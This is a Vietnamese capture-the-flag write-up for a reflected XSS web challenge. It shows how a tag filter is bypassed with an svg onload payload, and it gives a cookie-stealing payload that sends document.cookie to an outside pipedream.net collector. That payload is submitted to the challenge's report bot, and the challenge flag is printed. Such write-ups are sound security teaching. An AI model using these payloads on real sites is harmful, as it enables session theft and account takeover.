# Web
## 1.Hi Hi Hi
    http://146.190.115.228:20109
### Solution:
+ Mình nhập thử text `hacked` thì thấy hiện trên Dom nên mình đoán có thể là lỗi reflect:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325544380_1539785776490524_506576420518357102_n.png?stp=dst-png_p403x403&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=mxRJjvm2h5sAX-IFnMw&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdShnEbKx5Gp4lBumSBFoVxAwb74bLspb0fMNVfKDYhvdw&oe=63EDEAC8)
+ Mình thử nhập `<script>alert(10)</script>` thì bị filter:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325232288_1517370485416235_7328303388423511686_n.png?stp=dst-png_s240x240&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=H8c6WsiYx8oAX-QqT_I&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRiX6GujoIBAJpe-w_pNUJMuDinPcWTvP6VU6nypt-5YA&oe=63EDEFAB)
+ Sau mình dùng burpsuite thì thấy message in ra nằm trong thẻ div:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324403300_562610902450716_1189522020715437705_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=6yIEw5U1lVIAX9zld-t&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTY0ssYhl3oZNB1qfBO3-_ceuEbpJthnSPDJ7RMv_YsZg&oe=63EDE9DC)
+ Mình thử dùng thẻ img mà bị filter,sau mình dùng thẻ svg `<svg onload="alert(10)"/>` thì được thật:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325477432_2098078310381765_4736637555871183436_n.png?stp=dst-png_s320x320&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=jKu7GXo4pP8AX9qvg-l&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSkixswTyARzDg7zpDQLwZu4b0kxf1lCMFazZyQjhCN2A&oe=63EDF35D)
+ Nên mình thử lấy cookie của máy mình `<svg onload="window.location='https://eoudjoqqnbfym00.m.pipedream.net/?cookie='.concat(document.cookie)"/>` thi get duoc cookie:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/323534900_8642520609151521_3244213864135894936_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=lRuhKcBSIhoAX97nNtA&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ6GC-6hq-578_lPfn9EAdr3iu_mZKfmt4P1PExbJeDzA&oe=63EDCE99)
+ Nên mình thử gửi report luôn payload:
`http://127.0.0.1:13337/?message=http://146.190.115.228:20109/?message=%3Csvg+onload%3D%22window.location%3D%27https%3A%2F%2Fexxxxxxxxxxxx00.m.pipedream.net%2F%3Fcookie%3D%27.concat%28document.cookie%29%22%2F%3E` thì nhận được flag.

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325683778_853163225933721_2454076518486329042_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=P1Ocdj5eECoAX8E_sJb&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQxmVbprZ3IDsyaHAJItwRZj36LoTcpkwy5tE0aWTvcgg&oe=63EDD4F2)

> Flag: KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}


